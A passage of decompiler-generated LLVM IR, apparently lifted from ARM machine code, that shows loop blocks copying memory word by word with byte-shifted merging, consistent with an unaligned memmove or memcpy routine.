  %v5_16ca4 = icmp slt i32 %v4_16ca4, 0
  store i1 %v5_16ca4, i1* %cpsr_v.global-to-local, align 1
  %v6_16ca4 = icmp slt i32 %v1_16ca4, 0
  store i1 %v6_16ca4, i1* %cpsr_n.global-to-local, align 1
  %v7_16ca4 = icmp eq i32 %v1_16ca4, 0
  store i1 %v7_16ca4, i1* %cpsr_z.global-to-local, align 1
  %v2_16ca8 = xor i1 %v6_16ca4, %v5_16ca4
  br i1 %v2_16ca8, label %dec_label_pc_16cc4, label %dec_label_pc_16cac

dec_label_pc_16cac:                               ; preds = %dec_label_pc_16ca0, %dec_label_pc_16c60, %dec_label_pc_16cac
  %v1_16cb8 = phi i32 [ %v4_16cb8, %dec_label_pc_16cac ], [ %v12_16c94, %dec_label_pc_16ca0 ], [ %v0_16d6c76, %dec_label_pc_16c60 ]
  %v0_16cac = load i32, i32* %lr.global-to-local, align 4
  %v3_16cac = udiv i32 %v0_16cac, 256
  store i32 %v3_16cac, i32* %ip.global-to-local, align 4
  %v0_16cb0 = load i32, i32* %r1.global-to-local, align 4
  %v1_16cb0 = inttoptr i32 %v0_16cb0 to i32*
  %v2_16cb0 = load i32, i32* %v1_16cb0, align 4
  store i32 %v2_16cb0, i32* %lr.global-to-local, align 4
  %v4_16cb0 = add i32 %v0_16cb0, 4
  store i32 %v4_16cb0, i32* %r1.global-to-local, align 4
  %v4_16cb4 = mul i32 %v2_16cb0, 16777216
  %v5_16cb4 = or i32 %v4_16cb4, %v3_16cac
  store i32 %v5_16cb4, i32* @ip, align 4
  %v2_16cb8 = inttoptr i32 %v1_16cb8 to i32*
  store i32 %v5_16cb4, i32* %v2_16cb8, align 4
  %v3_16cb8 = load i32, i32* @r0, align 4
  %v4_16cb8 = add i32 %v3_16cb8, 4
  store i32 %v4_16cb8, i32* @r0, align 4
  %v0_16cbc = load i32, i32* %r2.global-to-local, align 4
  %v1_16cbc = add i32 %v0_16cbc, -4
  store i32 %v1_16cbc, i32* %r2.global-to-local, align 4
  %v3_16cbc = sub i32 3, %v0_16cbc
  %v4_16cbc = and i32 %v3_16cbc, %v0_16cbc
  %v5_16cbc = icmp slt i32 %v4_16cbc, 0
  %v6_16cbc = icmp slt i32 %v1_16cbc, 0
  %v2_16cc0 = xor i1 %v6_16cbc, %v5_16cbc
  br i1 %v2_16cc0, label %dec_label_pc_16cc4.loopexit, label %dec_label_pc_16cac

dec_label_pc_16cc4.loopexit:                      ; preds = %dec_label_pc_16cac
  %v7_16cbc = icmp eq i32 %v0_16cbc, 4
  store i1 %v5_16cbc, i1* %cpsr_v.global-to-local, align 1
  store i1 %v6_16cbc, i1* %cpsr_n.global-to-local, align 1
  store i1 %v7_16cbc, i1* %cpsr_z.global-to-local, align 1
  br label %dec_label_pc_16cc4

dec_label_pc_16cc4:                               ; preds = %dec_label_pc_16cc4.loopexit, %dec_label_pc_16ca0
  %v0_16bec59 = phi i32 [ %v1_16cbc, %dec_label_pc_16cc4.loopexit ], [ %v1_16ca4, %dec_label_pc_16ca0 ]
  %v0_16cc4 = load i32, i32* %r1.global-to-local, align 4
  %v1_16cc4 = add i32 %v0_16cc4, -3
  store i32 %v1_16cc4, i32* @r1, align 4
  br label %bb140

dec_label_pc_16ccc:                               ; preds = %dec_label_pc_16c4c
  br i1 %v2_16cd0, label %dec_label_pc_16d18, label %dec_label_pc_16cd4

dec_label_pc_16cd4:                               ; preds = %dec_label_pc_16ccc
  store i32 %v1_16ccc, i32* %r2.global-to-local, align 4
  %v3_16cd8 = load i32, i32* @r4, align 4
  store i32 %v3_16cd8, i32* %stack_var_-16, align 4
  %v6_16cd8 = load i32, i32* @r5, align 4
  store i32 %v6_16cd8, i32* %stack_var_-12, align 4
  br label %dec_label_pc_16cdc

dec_label_pc_16cdc:                               ; preds = %dec_label_pc_16cdc.dec_label_pc_16cdc_crit_edge, %dec_label_pc_16cd4
  %v0_16d00 = phi i32 [ %v12_16d00, %dec_label_pc_16cdc.dec_label_pc_16cdc_crit_edge ], [ %v0_16d6c76, %dec_label_pc_16cd4 ]
  %v0_16ce0 = phi i32 [ %v0_16ce0.pre, %dec_label_pc_16cdc.dec_label_pc_16cdc_crit_edge ], [ %v4_16c50, %dec_label_pc_16cd4 ]
  %v0_16cdc = phi i32 [ %v0_16cdc.pre, %dec_label_pc_16cdc.dec_label_pc_16cdc_crit_edge ], [ %v2_16c50, %dec_label_pc_16cd4 ]
  %v3_16cdc = udiv i32 %v0_16cdc, 65536
  %v1_16ce0 = inttoptr i32 %v0_16ce0 to i32*
  %v2_16ce0 = load i32, i32* %v1_16ce0, align 4
  store i32 %v2_16ce0, i32* %r4.global-to-local, align 4
  %v3_16ce0 = add i32 %v0_16ce0, 4
  %v4_16ce0 = inttoptr i32 %v3_16ce0 to i32*
  %v5_16ce0 = load i32, i32* %v4_16ce0, align 4
  store i32 %v5_16ce0, i32* %r5.global-to-local, align 4
  %v6_16ce0 = add i32 %v0_16ce0, 8
  %v7_16ce0 = inttoptr i32 %v6_16ce0 to i32*
  %v8_16ce0 = load i32, i32* %v7_16ce0, align 4
  store i32 %v8_16ce0, i32* %ip.global-to-local, align 4
  %v9_16ce0 = add i32 %v0_16ce0, 12
  %v10_16ce0 = inttoptr i32 %v9_16ce0 to i32*
  %v11_16ce0 = load i32, i32* %v10_16ce0, align 4
  store i32 %v11_16ce0, i32* %lr.global-to-local, align 4
  %v12_16ce0 = add i32 %v0_16ce0, 16
  store i32 %v12_16ce0, i32* %r1.global-to-local, align 4
  %v4_16ce4 = mul i32 %v2_16ce0, 65536
  %v5_16ce4 = or i32 %v4_16ce4, %v3_16cdc
  store i32 %v5_16ce4, i32* @r3, align 4
  %v3_16ce8 = udiv i32 %v2_16ce0, 65536
  %v4_16cec = mul i32 %v5_16ce0, 65536
  %v5_16cec = or i32 %v4_16cec, %v3_16ce8
  store i32 %v5_16cec, i32* %r4.global-to-local, align 4
  %v3_16cf0 = udiv i32 %v5_16ce0, 65536
  %v4_16cf4 = mul i32 %v8_16ce0, 65536
  %v5_16cf4 = or i32 %v4_16cf4, %v3_16cf0
  store i32 %v5_16cf4, i32* %r5.global-to-local, align 4
  %v3_16cf8 = udiv i32 %v8_16ce0, 65536
  %v4_16cfc = mul i32 %v11_16ce0, 65536
  %v5_16cfc = or i32 %v4_16cfc, %v3_16cf8
  store i32 %v5_16cfc, i32* @ip, align 4
  %v1_16d00 = inttoptr i32 %v0_16d00 to i32*
  store i32 %v5_16ce4, i32* %v1_16d00, align 4
  %v3_16d00 = add i32 %v0_16d00, 4
  %v4_16d00 = inttoptr i32 %v3_16d00 to i32*
  %v5_16d00 = load i32, i32* %r4.global-to-local, align 4
  store i32 %v5_16d00, i32* %v4_16d00, align 4
  %v6_16d00 = add i32 %v0_16d00, 8
  %v7_16d00 = inttoptr i32 %v6_16d00 to i32*
  %v8_16d00 = load i32, i32* %r5.global-to-local, align 4
  store i32 %v8_16d00, i32* %v7_16d00, align 4
  %v9_16d00 = add i32 %v0_16d00, 12
  %v10_16d00 = inttoptr i32 %v9_16d00 to i32*
  %v11_16d00 = load i32, i32* @ip, align 4
  store i32 %v11_16d00, i32* %v10_16d00, align 4
  %v12_16d00 = add i32 %v0_16d00, 16
  store i32 %v12_16d00, i32* @r0, align 4
  %v0_16d04 = load i32, i32* %r2.global-to-local, align 4
  %v1_16d04 = add i32 %v0_16d04, -16
  store i32 %v1_16d04, i32* %r2.global-to-local, align 4
  %v3_16d04 = sub i32 15, %v0_16d04
  %v4_16d04 = and i32 %v3_16d04, %v0_16d04
  %v5_16d04 = icmp slt i32 %v4_16d04, 0
  %v6_16d04 = icmp slt i32 %v1_16d04, 0
  %v2_16d08 = xor i1 %v6_16d04, %v5_16d04
  br i1 %v2_16d08, label %dec_label_pc_16d0c, label %dec_label_pc_16cdc.dec_label_pc_16cdc_crit_edge

dec_label_pc_16cdc.dec_label_pc_16cdc_crit_edge:  ; preds = %dec_label_pc_16cdc
  %v0_16cdc.pre = load i32, i32* %lr.global-to-local, align 4
  %v0_16ce0.pre = load i32, i32* %r1.global-to-local, align 4
  br label %dec_label_pc_16cdc

dec_label_pc_16d0c:                               ; preds = %dec_label_pc_16cdc
  %v2_16d0c = load i32, i32* %stack_var_-16, align 4
  store i32 %v2_16d0c, i32* @r4, align 4
  %v5_16d0c = load i32, i32* %stack_var_-12, align 4
  store i32 %v5_16d0c, i32* @r5, align 4
  %v1_16d10 = add i32 %v0_16d04, -4
  store i32 %v1_16d10, i32* %r2.global-to-local, align 4
  %v3_16d10 = add i32 %v0_16d04, 2147483632
  %v4_16d10 = and i32 %v1_16d10, %v3_16d10
  %v5_16d10 = icmp slt i32 %v4_16d10, 0
  store i1 %v5_16d10, i1* %cpsr_v.global-to-local, align 1
  %v6_16d10 = icmp slt i32 %v1_16d10, 0
  store i1 %v6_16d10, i1* %cpsr_n.global-to-local, align 1
  %v7_16d10 = icmp eq i32 %v1_16d10, 0
  store i1 %v7_16d10, i1* %cpsr_z.global-to-local, align 1
  %v2_16d14 = xor i1 %v6_16d10, %v5_16d10
  br i1 %v2_16d14, label %dec_label_pc_16d30, label %dec_label_pc_16d18

dec_label_pc_16d18:                               ; preds = %dec_label_pc_16d0c, %dec_label_pc_16ccc, %dec_label_pc_16d18
  %v1_16d24 = phi i32 [ %v4_16d24, %dec_label_pc_16d18 ], [ %v12_16d00, %dec_label_pc_16d0c ], [ %v0_16d6c76, %dec_label_pc_16ccc ]
  %v0_16d18 = load i32, i32* %lr.global-to-local, align 4
  %v3_16d18 = udiv i32 %v0_16d18, 65536
  store i32 %v3_16d18, i32* %ip.global-to-local, align 4
  %v0_16d1c = load i32, i32* %r1.global-to-local, align 4
  %v1_16d1c = inttoptr i32 %v0_16d1c to i32*
  %v2_16d1c = load i32, i32* %v1_16d1c, align 4
  store i32 %v2_16d1c, i32* %lr.global-to-local, align 4
  %v4_16d1c = add i32 %v0_16d1c, 4
  store i32 %v4_16d1c, i32* %r1.global-to-local, align 4
  %v4_16d20 = mul i32 %v2_16d1c, 65536
  %v5_16d20 = or i32 %v4_16d20, %v3_16d18
  store i32 %v5_16d20, i32* @ip, align 4
  %v2_16d24 = inttoptr i32 %v1_16d24 to i32*
  store i32 %v5_16d20, i32* %v2_16d24, align 4
  %v3_16d24 = load i32, i32* @r0, align 4
  %v4_16d24 = add i32 %v3_16d24, 4
  store i32 %v4_16d24, i32* @r0, align 4
  %v0_16d28 = load i32, i32* %r2.global-to-local, align 4
  %v1_16d28 = add i32 %v0_16d28, -4
  store i32 %v1_16d28, i32* %r2.global-to-local, align 4
  %v3_16d28 = sub i32 3, %v0_16d28
  %v4_16d28 = and i32 %v3_16d28, %v0_16d28
  %v5_16d28 = icmp slt i32 %v4_16d28, 0
  %v6_16d28 = icmp slt i32 %v1_16d28, 0
  %v2_16d2c = xor i1 %v6_16d28, %v5_16d28
  br i1 %v2_16d2c, label %dec_label_pc_16d30.loopexit, label %dec_label_pc_16d18

dec_label_pc_16d30.loopexit:                      ; preds = %dec_label_pc_16d18
  %v7_16d28 = icmp eq i32 %v0_16d28, 4
  store i1 %v5_16d28, i1* %cpsr_v.global-to-local, align 1
  store i1 %v6_16d28, i1* %cpsr_n.global-to-local, align 1
  store i1 %v7_16d28, i1* %cpsr_z.global-to-local, align 1
  br label %dec_label_pc_16d30

dec_label_pc_16d30:                               ; preds = %dec_label_pc_16d30.loopexit, %dec_label_pc_16d0c
  %v0_16bec60 = phi i32 [ %v1_16d28, %dec_label_pc_16d30.loopexit ], [ %v1_16d10, %dec_label_pc_16d0c ]
  %v0_16d30 = load i32, i32* %r1.global-to-local, align 4
  %v1_16d30 = add i32 %v0_16d30, -2
  store i32 %v1_16d30, i32* @r1, align 4
  br label %bb140

dec_label_pc_16d38:                               ; preds = %dec_label_pc_16c4c
  br i1 %v2_16cd0, label %dec_label_pc_16d84, label %dec_label_pc_16d40

dec_label_pc_16d40:                               ; preds = %dec_label_pc_16d38
  store i32 %v1_16ccc, i32* %r2.global-to-local, align 4
  %v3_16d44 = load i32, i32* @r4, align 4
  store i32 %v3_16d44, i32* %stack_var_-16, align 4
  %v6_16d44 = load i32, i32* @r5, align 4
  store i32 %v6_16d44, i32* %stack_var_-12, align 4
  br label %dec_label_pc_16d48

dec_label_pc_16d48:                               ; preds = %dec_label_pc_16d48.dec_label_pc_16d48_crit_edge, %dec_label_pc_16d40
  %v0_16d6c = phi i32 [ %v12_16d6c, %dec_label_pc_16d48.dec_label_pc_16d48_crit_edge ], [ %v0_16d6c76, %dec_label_pc_16d40 ]
  %v0_16d4c = phi i32 [ %v0_16d4c.pre, %dec_label_pc_16d48.dec_label_pc_16d48_crit_edge ], [ %v4_16c50, %dec_label_pc_16d40 ]
  %v0_16d48 = phi i32 [ %v0_16d48.pre, %dec_label_pc_16d48.dec_label_pc_16d48_crit_edge ], [ %v2_16c50, %dec_label_pc_16d40 ]
  %v3_16d48 = udiv i32 %v0_16d48, 16777216
  %v1_16d4c = inttoptr i32 %v0_16d4c to i32*
  %v2_16d4c = load i32, i32* %v1_16d4c, align 4
  store i32 %v2_16d4c, i32* %r4.global-to-local, align 4
  %v3_16d4c = add i32 %v0_16d4c, 4
  %v4_16d4c = inttoptr i32 %v3_16d4c to i32*
  %v5_16d4c = load i32, i32* %v4_16d4c, align 4
  store i32 %v5_16d4c, i32* %r5.global-to-local, align 4
  %v6_16d4c = add i32 %v0_16d4c, 8
  %v7_16d4c = inttoptr i32 %v6_16d4c to i32*
  %v8_16d4c = load i32, i32* %v7_16d4c, align 4
  store i32 %v8_16d4c, i32* %ip.global-to-local, align 4
  %v9_16d4c = add i32 %v0_16d4c, 12
  %v10_16d4c = inttoptr i32 %v9_16d4c to i32*
  %v11_16d4c = load i32, i32* %v10_16d4c, align 4
  store i32 %v11_16d4c, i32* %lr.global-to-local, align 4
  %v12_16d4c = add i32 %v0_16d4c, 16
  store i32 %v12_16d4c, i32* %r1.global-to-local, align 4
  %v4_16d50 = mul i32 %v2_16d4c, 256
  %v5_16d50 = or i32 %v4_16d50, %v3_16d48
  store i32 %v5_16d50, i32* @r3, align 4
  %v3_16d54 = udiv i32 %v2_16d4c, 16777216
  %v4_16d58 = mul i32 %v5_16d4c, 256
  %v5_16d58 = or i32 %v4_16d58, %v3_16d54
  store i32 %v5_16d58, i32* %r4.global-to-local, align 4
  %v3_16d5c = udiv i32 %v5_16d4c, 16777216
  %v4_16d60 = mul i32 %v8_16d4c, 256
  %v5_16d60 = or i32 %v4_16d60, %v3_16d5c
  store i32 %v5_16d60, i32* %r5.global-to-local, align 4
  %v3_16d64 = udiv i32 %v8_16d4c, 16777216
  %v4_16d68 = mul i32 %v11_16d4c, 256
  %v5_16d68 = or i32 %v4_16d68, %v3_16d64
  store i32 %v5_16d68, i32* @ip, align 4
  %v1_16d6c = inttoptr i32 %v0_16d6c to i32*
  store i32 %v5_16d50, i32* %v1_16d6c, align 4
  %v3_16d6c = add i32 %v0_16d6c, 4
  %v4_16d6c = inttoptr i32 %v3_16d6c to i32*
  %v5_16d6c = load i32, i32* %r4.global-to-local, align 4
  store i32 %v5_16d6c, i32* %v4_16d6c, align 4
  %v6_16d6c = add i32 %v0_16d6c, 8
  %v7_16d6c = inttoptr i32 %v6_16d6c to i32*
  %v8_16d6c = load i32, i32* %r5.global-to-local, align 4
  store i32 %v8_16d6c, i32* %v7_16d6c, align 4
  %v9_16d6c = add i32 %v0_16d6c, 12
  %v10_16d6c = inttoptr i32 %v9_16d6c to i32*
  %v11_16d6c = load i32, i32* @ip, align 4
  store i32 %v11_16d6c, i32* %v10_16d6c, align 4
  %v12_16d6c = add i32 %v0_16d6c, 16
  store i32 %v12_16d6c, i32* @r0, align 4
  %v0_16d70 = load i32, i32* %r2.global-to-local, align 4
  %v1_16d70 = add i32 %v0_16d70, -16
  store i32 %v1_16d70, i32* %r2.global-to-local, align 4
  %v3_16d70 = sub i32 15, %v0_16d70
  %v4_16d70 = and i32 %v3_16d70, %v0_16d70
  %v5_16d70 = icmp slt i32 %v4_16d70, 0
  %v6_16d70 = icmp slt i32 %v1_16d70, 0
  %v2_16d74 = xor i1 %v6_16d70, %v5_16d70
  br i1 %v2_16d74, label %dec_label_pc_16d78, label %dec_label_pc_16d48.dec_label_pc_16d48_crit_edge

dec_label_pc_16d48.dec_label_pc_16d48_crit_edge:  ; preds = %dec_label_pc_16d48
  %v0_16d48.pre = load i32, i32* %lr.global-to-local, align 4
  %v0_16d4c.pre = load i32, i32* %r1.global-to-local, align 4
  br label %dec_label_pc_16d48

dec_label_pc_16d78:                               ; preds = %dec_label_pc_16d48
  %v2_16d78 = load i32, i32* %stack_var_-16, align 4
  store i32 %v2_16d78, i32* @r4, align 4
  %v5_16d78 = load i32, i32* %stack_var_-12, align 4
  store i32 %v5_16d78, i32* @r5, align 4
  %v1_16d7c = add i32 %v0_16d70, -4
  store i32 %v1_16d7c, i32* %r2.global-to-local, align 4
  %v3_16d7c = add i32 %v0_16d70, 2147483632
  %v4_16d7c = and i32 %v1_16d7c, %v3_16d7c
  %v5_16d7c = icmp slt i32 %v4_16d7c, 0
  store i1 %v5_16d7c, i1* %cpsr_v.global-to-local, align 1
  %v6_16d7c = icmp slt i32 %v1_16d7c, 0
  store i1 %v6_16d7c, i1* %cpsr_n.global-to-local, align 1
  %v7_16d7c = icmp eq i32 %v1_16d7c, 0
  store i1 %v7_16d7c, i1* %cpsr_z.global-to-local, align 1
  %v2_16d80 = xor i1 %v6_16d7c, %v5_16d7c
  br i1 %v2_16d80, label %dec_label_pc_16d9c, label %dec_label_pc_16d84

dec_label_pc_16d84:                               ; preds = %dec_label_pc_16d78, %dec_label_pc_16d38, %dec_label_pc_16d84
  %v1_16d90 = phi i32 [ %v4_16d90, %dec_label_pc_16d84 ], [ %v12_16d6c, %dec_label_pc_16d78 ], [ %v0_16d6c76, %dec_label_pc_16d38 ]
  %v0_16d84 = load i32, i32* %lr.global-to-local, align 4
  %v3_16d84 = udiv i32 %v0_16d84, 16777216
  store i32 %v3_16d84, i32* %ip.global-to-local, align 4
  %v0_16d88 = load i32, i32* %r1.global-to-local, align 4
  %v1_16d88 = inttoptr i32 %v0_16d88 to i32*
  %v2_16d88 = load i32, i32* %v1_16d88, align 4
  store i32 %v2_16d88, i32* %lr.global-to-local, align 4
  %v4_16d88 = add i32 %v0_16d88, 4
  store i32 %v4_16d88, i32* %r1.global-to-local, align 4
  %v4_16d8c = mul i32 %v2_16d88, 256
  %v5_16d8c = or i32 %v4_16d8c, %v3_16d84
  store i32 %v5_16d8c, i32* @ip, align 4
  %v2_16d90 = inttoptr i32 %v1_16d90 to i32*
  store i32 %v5_16d8c, i32* %v2_16d90, align 4
  %v3_16d90 = load i32, i32* @r0, align 4
  %v4_16d90 = add i32 %v3_16d90, 4
  store i32 %v4_16d90, i32* @r0, align 4
  %v0_16d94 = load i32, i32* %r2.global-to-local, align 4
  %v1_16d94 = add i32 %v0_16d94, -4
  store i32 %v1_16d94, i32* %r2.global-to-local, align 4
  %v3_16d94 = sub i32 3, %v0_16d94
  %v4_16d94 = and i32 %v3_16d94, %v0_16d94
  %v5_16d94 = icmp slt i32 %v4_16d94, 0
  %v6_16d94 = icmp slt i32 %v1_16d94, 0
  %v2_16d98 = xor i1 %v6_16d94, %v5_16d94
  br i1 %v2_16d98, label %dec_label_pc_16d9c.loopexit, label %dec_label_pc_16d84

dec_label_pc_16d9c.loopexit:                      ; preds = %dec_label_pc_16d84
  %v7_16d94 = icmp eq i32 %v0_16d94, 4
  store i1 %v5_16d94, i1* %cpsr_v.global-to-local, align 1
  store i1 %v6_16d94, i1* %cpsr_n.global-to-local, align 1
  store i1 %v7_16d94, i1* %cpsr_z.global-to-local, align 1
  br label %dec_label_pc_16d9c

dec_label_pc_16d9c:                               ; preds = %dec_label_pc_16d9c.loopexit, %dec_label_pc_16d78
  %v0_16bec61 = phi i32 [ %v1_16d94, %dec_label_pc_16d9c.loopexit ], [ %v1_16d7c, %dec_label_pc_16d78 ]
  %v0_16d9c = load i32, i32* %r1.global-to-local, align 4
  %v1_16d9c = add i32 %v0_16d9c, -1
  store i32 %v1_16d9c, i32* @r1, align 4
  br label %bb140

dec_label_pc_16da4:                               ; preds = %entry
  %v1_16da4 = load i32, i32* @r2, align 4
  %v2_16da4 = add i32 %v1_16da4, %v0_16b50
  store i32 %v2_16da4, i32* %r1.global-to-local, align 4
  %v2_16da8 = add i32 %v1_16da4, %v1_16b50
  store i32 %v2_16da8, i32* %r0.global-to-local, align 4
  %v2_16dac = add i32 %v1_16da4, -4
  store i32 %v2_16dac, i32* %r2.global-to-local, align 4
  %v4_16dac = sub i32 3, %v1_16da4
  %v5_16dac = and i32 %v4_16dac, %v1_16da4
  %v6_16dac = icmp slt i32 %v5_16dac, 0
  store i1 %v6_16dac, i1* %cpsr_v.global-to-local, align 1
  %v7_16dac = icmp slt i32 %v2_16dac, 0
  store i1 %v7_16dac, i1* %cpsr_n.global-to-local, align 1
  %v8_16dac = icmp eq i32 %v1_16da4, 4
  store i1 %v8_16dac, i1* %cpsr_z.global-to-local, align 1
  %v5_16db0 = icmp slt i32 %v1_16da4, 4
  br i1 %v5_16db0, label %bb150, label %dec_label_pc_16db4

dec_label_pc_16db4:                               ; preds = %dec_label_pc_16da4
  %v1_16db4 = urem i32 %v2_16da8, 4
  store i32 %v1_16db4, i32* @ip, align 4
  store i1 false, i1* %cpsr_n.global-to-local, align 1
  %v2_16db4 = icmp eq i32 %v1_16db4, 0
  store i1 %v2_16db4, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_16db4, label %dec_label_pc_16dbc, label %dec_label_pc_16e5c

dec_label_pc_16dbc:                               ; preds = %dec_label_pc_16db4
  %v1_16dbc = urem i32 %v2_16da4, 4
  store i32 %v1_16dbc, i32* @ip, align 4
  store i1 false, i1* %cpsr_n.global-to-local, align 1
  %v2_16dbc = icmp eq i32 %v1_16dbc, 0
  store i1 %v2_16dbc, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_16dbc, label %dec_label_pc_16dc4, label %dec_label_pc_16e88

dec_label_pc_16dc4:                               ; preds = %dec_label_pc_16dbc, %dec_label_pc_16e80
  %v0_16ddc37 = phi i32 [ %v2_16da8, %dec_label_pc_16dbc ], [ %v0_16ed020, %dec_label_pc_16e80 ]
  %v0_16dd836 = phi i32 [ %v2_16da4, %dec_label_pc_16dbc ], [ %v0_16e80, %dec_label_pc_16e80 ]
  %v0_16dc4 = phi i32 [ %v2_16dac, %dec_label_pc_16dbc ], [ %v2_16e78, %dec_label_pc_16e80 ]
  %v2_16dc4 = add i32 %v0_16dc4, -8
  store i32 %v2_16dc4, i32* %r2.global-to-local, align 4
  %v4_16dc4 = sub i32 7, %v0_16dc4
  %v5_16dc4 = and i32 %v4_16dc4, %v0_16dc4
  %v6_16dc4 = icmp slt i32 %v5_16dc4, 0
  store i1 %v6_16dc4, i1* %cpsr_v.global-to-local, align 1
  %v7_16dc4 = icmp slt i32 %v2_16dc4, 0
  store i1 %v7_16dc4, i1* %cpsr_n.global-to-local, align 1
  %v8_16dc4 = icmp eq i32 %v0_16dc4, 8
  store i1 %v8_16dc4, i1* %cpsr_z.global-to-local, align 1
  %v5_16dc8 = icmp slt i32 %v0_16dc4, 8
  br i1 %v5_16dc8, label %dec_label_pc_16e14, label %dec_label_pc_16dcc

dec_label_pc_16dcc:                               ; preds = %dec_label_pc_16dc4
  %v3_16dcc = load i32, i32* @r4, align 4
  %v5_16dcc = inttoptr i32 %v3_16dcc to i8*
  store i8* %v5_16dcc, i8** %stack_var_-8, align 4
  %v8_16dcc = load i32, i32* @lr, align 4
  %v2_16dd0 = add i32 %v0_16dc4, -28
  store i32 %v2_16dd0, i32* %r2.global-to-local, align 4
  %v4_16dd0 = sub i32 27, %v0_16dc4
  %v5_16dd0 = and i32 %v4_16dd0, %v2_16dc4
  %v6_16dd0 = icmp slt i32 %v5_16dd0, 0
  store i1 %v6_16dd0, i1* %cpsr_v.global-to-local, align 1
  %v7_16dd0 = icmp slt i32 %v2_16dd0, 0
  store i1 %v7_16dd0, i1* %cpsr_n.global-to-local, align 1
  %v8_16dd0 = icmp eq i32 %v2_16dc4, 20
  store i1 %v8_16dd0, i1* %cpsr_z.global-to-local, align 1
  %v5_16dd4 = icmp slt i32 %v2_16dc4, 20
  br i1 %v5_16dd4, label %dec_label_pc_16df0, label %dec_label_pc_16dd8

dec_label_pc_16dd8:                               ; preds = %dec_label_pc_16dcc, %dec_label_pc_16dd8.dec_label_pc_16dd8_crit_edge
  %v0_16ddc = phi i32 [ %v1_16de4, %dec_label_pc_16dd8.dec_label_pc_16dd8_crit_edge ], [ %v0_16ddc37, %dec_label_pc_16dcc ]
  %v0_16dd8 = phi i32 [ %v0_16dd8.pre, %dec_label_pc_16dd8.dec_label_pc_16dd8_crit_edge ], [ %v0_16dd836, %dec_label_pc_16dcc ]
  %v1_16dd8 = add i32 %v0_16dd8, -4
  %v2_16dd8 = inttoptr i32 %v1_16dd8 to i32*
  %v3_16dd8 = load i32, i32* %v2_16dd8, align 4
  %v4_16dd8 = add i32 %v0_16dd8, -8
  %v5_16dd8 = inttoptr i32 %v4_16dd8 to i32*
  %v6_16dd8 = load i32, i32* %v5_16dd8, align 4
  store i32 %v6_16dd8, i32* %r4.global-to-local, align 4
  %v7_16dd8 = add i32 %v0_16dd8, -12
  %v8_16dd8 = inttoptr i32 %v7_16dd8 to i32*
  %v9_16dd8 = load i32, i32* %v8_16dd8, align 4
  store i32 %v9_16dd8, i32* %ip.global-to-local, align 4
  %v10_16dd8 = add i32 %v0_16dd8, -16
  %v11_16dd8 = inttoptr i32 %v10_16dd8 to i32*
  %v12_16dd8 = load i32, i32* %v11_16dd8, align 4
  store i32 %v12_16dd8, i32* %lr.global-to-local, align 4
  store i32 %v10_16dd8, i32* %r1.global-to-local, align 4
  %v1_16ddc = add i32 %v0_16ddc, -16
  %v2_16ddc = inttoptr i32 %v1_16ddc to i32*
  store i32 %v3_16dd8, i32* %v2_16ddc, align 4
  %v4_16ddc = add i32 %v0_16ddc, -12
  %v5_16ddc = inttoptr i32 %v4_16ddc to i32*
  %v6_16ddc = load i32, i32* %r4.global-to-local, align 4
  store i32 %v6_16ddc, i32* %v5_16ddc, align 4
  %v7_16ddc = add i32 %v0_16ddc, -8
  %v8_16ddc = inttoptr i32 %v7_16ddc to i32*
  %v9_16ddc = load i32, i32* %ip.global-to-local, align 4
  store i32 %v9_16ddc, i32* %v8_16ddc, align 4
  %v10_16ddc = add i32 %v0_16ddc, -4
  %v11_16ddc = inttoptr i32 %v10_16ddc to i32*
  %v12_16ddc = load i32, i32* %lr.global-to-local, align 4
  store i32 %v12_16ddc, i32* %v11_16ddc, align 4
  store i32 %v1_16ddc, i32* %r0.global-to-local, align 4
  %v0_16de0 = load i32, i32* %r1.global-to-local, align 4
  %v1_16de0 = add i32 %v0_16de0, -4
  %v2_16de0 = inttoptr i32 %v1_16de0 to i32*
  %v3_16de0 = load i32, i32* %v2_16de0, align 4
  store i32 %v3_16de0, i32* @r3, align 4
  %v4_16de0 = add i32 %v0_16de0, -8
  %v5_16de0 = inttoptr i32 %v4_16de0 to i32*
  %v6_16de0 = load i32, i32* %v5_16de0, align 4
  store i32 %v6_16de0, i32* %r4.global-to-local, align 4
  %v7_16de0 = add i32 %v0_16de0, -12
  %v8_16de0 = inttoptr i32 %v7_16de0 to i32*
  %v9_16de0 = load i32, i32* %v8_16de0, align 4
  store i32 %v9_16de0, i32* @ip, align 4
  %v10_16de0 = add i32 %v0_16de0, -16
  %v11_16de0 = inttoptr i32 %v10_16de0 to i32*
  %v12_16de0 = load i32, i32* %v11_16de0, align 4
  store i32 %v12_16de0, i32* %lr.global-to-local, align 4
  store i32 %v10_16de0, i32* %r1.global-to-local, align 4
  %v1_16de4 = add i32 %v0_16ddc, -32
  %v2_16de4 = inttoptr i32 %v1_16de4 to i32*
  store i32 %v3_16de0, i32* %v2_16de4, align 4
  %v4_16de4 = add i32 %v0_16ddc, -28
  %v5_16de4 = inttoptr i32 %v4_16de4 to i32*
  %v6_16de4 = load i32, i32* %r4.global-to-local, align 4
  store i32 %v6_16de4, i32* %v5_16de4, align 4
  %v7_16de4 = add i32 %v0_16ddc, -24
  %v8_16de4 = inttoptr i32 %v7_16de4 to i32*
  %v9_16de4 = load i32, i32* @ip, align 4
  store i32 %v9_16de4, i32* %v8_16de4, align 4
  %v10_16de4 = add i32 %v0_16ddc, -20
  %v11_16de4 = inttoptr i32 %v10_16de4 to i32*
  %v12_16de4 = load i32, i32* %lr.global-to-local, align 4
  store i32 %v12_16de4, i32* %v11_16de4, align 4
  store i32 %v1_16de4, i32* %r0.global-to-local, align 4
  %v0_16de8 = load i32, i32* %r2.global-to-local, align 4
  %v2_16de8 = add i32 %v0_16de8, -32
  store i32 %v2_16de8, i32* %r2.global-to-local, align 4
  %v6_16dec = icmp slt i32 %v0_16de8, 32
  br i1 %v6_16dec, label %dec_label_pc_16df0.loopexit, label %dec_label_pc_16dd8.dec_label_pc_16dd8_crit_edge

dec_label_pc_16dd8.dec_label_pc_16dd8_crit_edge:  ; preds = %dec_label_pc_16dd8
  %v0_16dd8.pre = load i32, i32* %r1.global-to-local, align 4
  br label %dec_label_pc_16dd8

dec_label_pc_16df0.loopexit:                      ; preds = %dec_label_pc_16dd8
  %v4_16de8 = sub i32 31, %v0_16de8
  %v5_16de8 = and i32 %v4_16de8, %v0_16de8
  %v6_16de8 = icmp slt i32 %v5_16de8, 0
  %v7_16de8 = icmp slt i32 %v2_16de8, 0
  store i1 %v6_16de8, i1* %cpsr_v.global-to-local, align 1
  store i1 %v7_16de8, i1* %cpsr_n.global-to-local, align 1
